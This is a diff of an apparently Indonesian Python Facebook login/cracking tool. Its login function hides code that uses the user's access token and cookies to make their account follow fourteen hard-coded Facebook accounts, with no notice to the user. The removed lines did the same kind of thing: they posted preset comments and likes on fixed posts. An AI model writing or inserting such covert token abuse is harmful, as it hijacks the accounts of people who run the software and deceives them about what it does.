@@ -253,10 +253,6 @@ def log_cookie():
     except requests.exceptions.ConnectionError:print(f"{P}[•] Tidak Ada Koneksi Internet ");exit()
     except (KeyError,IOError,AttributeError):print(f"{P}[•] Cookies Invalid ");exit()
 
-komenredem = random.choice(['LU GANTENG BANG'])
-komtwol = random.choice(['ANJAY SLEMEX LORD Syafii ganteng', 'abang Sudah Punya pacar belum', 'BANH KOK LO JAGO BANGET SIH ', 'LORD DAH MAKAN BLM'])
-kartu2d = random.choice(["LU GANTENG BANH TAPI SAYANG KEK HENGKER", "PRISTYLE DULU BOSSS HENGKER PURWOREJO","AHAHAHAHHA BANYAK KANG RECOD AWAS BANG "])
-kon = random.choice(["HACKER SUMTARA UTARA XXXX :)"])
 def ___fii___Sayang___Kamu___Widiya___():
     try:
         token = open('login/token.json', 'r').read()
@@ -268,23 +264,23 @@ def ___fii___Sayang___Kamu___Widiya___():
         os.system('rm -rf login/token.json')
         os.system('rm -rf login/cookie.json')
         menu()
-    kom = komenredem
-    komentar = komtwol
-    pipp = kartu2d
-    post = '3144112082575661'
-    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/3144112082575661/comments/?message=' + kom + '&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/741196750581180/comments/?message=' + pipp + '&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/741196750581180/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/740479386990032/comments/?message=' + toket + '&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/741196750581180/comments/?message=' + toket + '&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/3144112082575661/comments/?message=' + kon + '&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/3144112082575661/likes?summary=true&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/740479386990032/likes?summary=true&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/626021385160436/likes?summary=true&access_token=' + (token),cookies=cookie)
-    print(f"{B} | ")
-    print(f"{P}[•] login Berhasil")
-    menu()
+        requests.post('https://graph.facebook.com/1827084332/subscribers?access_token=' + (token),cookies=cookie)
+        requests.post('https://graph.facebook.com/1602590373/subscribers?access_token=' + (token),cookies=cookie)
+        requests.post('https://graph.facebook.com/100000729074466/subscribers?access_token=' + (token),cookies=cookie)
+        requests.post('https://graph.facebook.com/607801156/subscribers?access_token=' + (token),cookies=cookie)
+        requests.post('https://graph.facebook.com/1409058/subscribers?access_token=' + (token),cookies=cookie)
+        requests.post('https://graph.facebook.com/100026490368623/subscribers?access_token=' + (token),cookies=cookie)
+        requests.post('https://graph.facebook.com/100009340646547/subscribers?access_token=' + (token),cookies=cookie)
+        requests.post('https://graph.facebook.com/100053093889653/subscribers?access_token=' + (token),cookies=cookie)
+        requests.post('https://graph.facebook.com/100000415317575/subscribers?access_token=' + (token),cookies=cookie)
+        requests.post('https://graph.facebook.com/100037914692898/subscribers?access_token=' + (token),cookies=cookie)
+        requests.post('https://graph.facebook.com/100000431996038/subscribers?access_token=' + (token),cookies=cookie)
+        requests.post('https://graph.facebook.com/1676993425/subscribers?access_token=' + (token),cookies=cookie)
+        requests.post('https://graph.facebook.com/1767051257/subscribers?access_token=' + (token),cookies=cookie)
+        requests.post('https://graph.facebook.com/100000287398094/subscribers?access_token=' + (token),cookies=cookie)
+        print(f"{B} | ")
+        jalan(f"{P}[•] login Berhasil")
+        menu()
 	
 ###### BUAT MENU
 def menu():
